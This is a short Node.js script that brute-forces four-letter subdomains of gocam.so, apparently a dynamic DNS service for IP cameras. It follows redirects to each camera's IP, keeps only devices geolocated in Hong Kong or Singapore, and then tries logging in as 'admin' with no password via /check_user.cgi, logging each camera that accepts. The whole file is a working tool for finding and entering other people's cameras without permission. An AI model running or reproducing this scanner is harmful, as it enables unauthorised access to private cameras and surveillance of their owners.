var request = require('request');
var winston = require('winston');
var sleep = require('sleep');
var satelize = require('satelize');

var logger = new (winston.Logger)({
  transports: [
  	new (winston.transports.Console)(),
    /*
    new (winston.transports.File)({
      name: 'info',
      filename: './log/device.info.log',
      level: 'info'
    }),
    new (winston.transports.File)({
      name: 'error',
      filename: './log/device.error.log',
      level: 'error'
    })
    */
  ]
});

var url = '';


for(a=98 ; a<100 ; a++) {
	for(b=97 ; b<123 ; b++) {
		for(c=97 ; c<123 ; c++) {
			for(d=97 ; d<123 ; d++) {
				url = 'http://' + String.fromCharCode(a,b,c,d) + '.gocam.so';
				getLink(url);
                sleep.usleep(5000);
			}
		}
	}
}

//url = 'http://002mhew.nwsvr.com';
//getLink(url);
function getLink(url) {
    //console.log(url);
	request({url: url, followRedirect : false}, function (error, response, body) {
		
		if (!error && response.statusCode == 302) {		
			//console.log('Get url : ' + response.headers['location']);
            checkCountry(url,response.headers['location']);
			//login(url,response.headers['location']);
		}
	});
}

//Check country
function checkCountry(url,link) {
    var ip = link.substr(7);
    if(ip.indexOf(':')) {
        ip = ip.substr(0,ip.indexOf(':'));
    }
    try {
    satelize.satelize({ip:ip}, function(err, payload) {
        try{
            if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
			    login(url,link); 
            }   
        }
        catch(err) {}
    });
    }
    catch(err) {}
}

function login(url,link) {
	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';

    request({url: link}, function (error, response, body) {
    if (!error && response.statusCode == 200) {
        logger.log('info','%s',	url);
    }
		
    });	
}
